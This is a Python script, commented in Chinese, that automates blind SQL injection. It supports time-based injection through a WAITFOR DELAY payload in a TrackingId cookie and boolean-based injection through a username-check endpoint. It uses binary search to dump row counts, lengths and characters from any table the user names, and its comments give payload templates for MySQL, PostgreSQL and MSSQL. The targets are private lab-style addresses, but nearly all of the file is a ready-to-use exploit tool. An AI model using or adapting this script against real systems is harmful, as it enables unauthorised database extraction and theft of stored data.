#!/usr/bin/python3

# SQL盲注脚本 by Sunshine
import requests
import json
import sys
import time
from urllib.parse import quote

MODE="time-based"
DELAY = 3
def oracle(expression):
    if (MODE == "time-based"):
        start = 0
        attempt = 0
        while(True):
            start = time.time()
            payload = quote(f"';IF({expression}) WAITFOR DELAY '0:0:{DELAY}'-- -")
            cookies = {'TrackingId': f"d0944eb380d48adc3dc6effeb4805286{payload}"}
            r = requests.get(
                "http://10.129.204.202/",
                cookies=cookies
            )
            if (r.status_code == 200):
                break
            elif (attempt < 4):
                attempt = attempt + 1
            else:
                print("Network Error")
        if (time.time() - start > DELAY):
            return True
        else:
            return False
    elif (MODE == "boolean-based"):
        payload = f"r4nd0m' OR ({expression})-- -"
        response = requests.get(f'http://10.129.2.104/api/check-username.php?u={payload}')
        if (response.text == '{"status":"taken"}'):
            return True
        elif (response.text == '{"status":"available"}'):
            return False
        else:
            sys.exit()
    else:
        sys.exit()

column = input("SELECT ")
table = input("FROM ")
filters = input("WHERE ")

'''
判断行数
(SELECT COUNT({column}) FROM {table} WHERE {filters}) > {mid}
'''

'''
计算当前行列对应字符串长度
单行
MySQL/PostgreSQL: (SELECT LENGTH({column}) FROM {table} WHERE {filters} LIMIT 1) > {mid}
MSSQL: LEN((SELECT TOP 1 {column} FROM {table} WHERE {filters})) > {mid}

多行
MySQL/PostgreSQL: (SELECT LENGTH({column}) FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
MSSQL: LEN((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)) > {mid}

函数
MySQL/PostgreSQL: (SELECT LENGTH({column})) > {mid}
'''

'''
dump字符串
MySQL/PostgreSQL:
(SELECT ASCII(SUBSTRING({column},{i),1)) FROM {table} WHERE {filters} LIMIT 1) > {mid}
(SELECT ASCII(SUBSTRING({column},{i),1)) FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
MSSQL
ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table} WHERE {filters}),{i},1)) > {mid}
ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}
'''

'''
dump整数
MySQL/PostgreSQL
(SELECT {column} FROM {table} WHERE {filters} LIMIT 1) > {mid}
(SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
MSSQL
((SELECT TOP 1 {column} FROM {table} WHERE {filters})) > {mid}
((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)) > {mid}
函数
MySQL/PostgreSQL: (SELECT {column}) > {mid}
'''
RowCount = 0
low = 0 # 行数范围
high = 100
while low < high:
    mid = (low + high) // 2
    if oracle(f"(SELECT COUNT({column}) FROM {table} WHERE {filters}) > {mid}"):
        low = mid + 1
    else:
        high = mid
RowCount=low
print(f'{RowCount} row(s) in total')
sys.stdout.flush()
print()

for offset in range(0, RowCount):
    low = 0 # 长度范围
    high = 100
    while low < high:
        mid = (low + high) // 2
        if oracle(f"LEN((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)) > {mid}"):
            low = mid + 1
        else:
            high = mid
    length=low
    print(f'Length: {low}', end='')
    sys.stdout.flush()
    print()

    for i in range(1, length + 1):
        low = 32 # 可打印ASCII字符范围 32-127
        high = 127
        attempt = 0
        while(True):
            while low < high:
                mid = (low + high) // 2
                if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}"):
                    low = mid + 1
                else:
                    high = mid
            if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) = {low}"):
                print(chr(low), end='')
                break
            elif (attempt < 4):
                attempt = attempt + 1
            else:
                print("Network Unstable")
        sys.stdout.flush()
    print()
    print()
